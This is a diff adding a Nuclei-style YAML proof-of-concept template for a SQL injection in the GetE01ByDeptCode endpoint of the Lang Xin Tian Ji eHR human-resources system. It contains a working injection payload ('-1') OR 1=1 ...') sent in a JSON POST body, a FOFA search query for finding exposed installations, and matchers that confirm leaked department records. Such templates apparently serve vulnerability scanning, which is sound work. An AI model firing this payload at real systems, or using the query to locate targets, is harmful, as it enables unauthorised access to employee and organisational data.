@@ -1,0 +1,32 @@
+id: poc-yaml-hrsoft-e-hr-gete01bydeptcode-sqli
+info:
+  name: 朗新天霁智能eHR人力资源管理系统GetE01ByDeptCode存在SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: 朗新天霁人力资源管理系统
+    fofa: body="人力资源管理系统" && body="Silverlight"
+http:
+  - raw:
+      - |
+        POST /api/Com/GetE01ByDeptCode HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"deptCode":"-1') OR 1=1 AND ('UCOF'='UCOF"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"Dept_Code\":"
+          - "\"Dept_ID\""
+          - "\"Dept_Content\""
+      - type: word
+        part: header
+        words:
+          - "application/json"
